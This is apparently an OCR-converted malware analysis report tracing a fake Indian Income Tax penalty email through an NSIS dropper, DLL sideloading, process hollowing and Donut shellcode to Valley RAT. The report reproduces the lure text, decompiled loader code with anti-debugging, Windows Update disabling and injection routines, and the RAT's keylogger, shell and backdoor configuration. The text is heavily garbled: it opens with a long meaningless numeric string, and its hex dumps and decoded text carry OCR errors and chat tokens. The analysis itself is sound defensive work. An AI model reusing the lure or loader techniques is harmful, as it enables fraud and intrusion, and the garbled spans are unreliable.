6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( 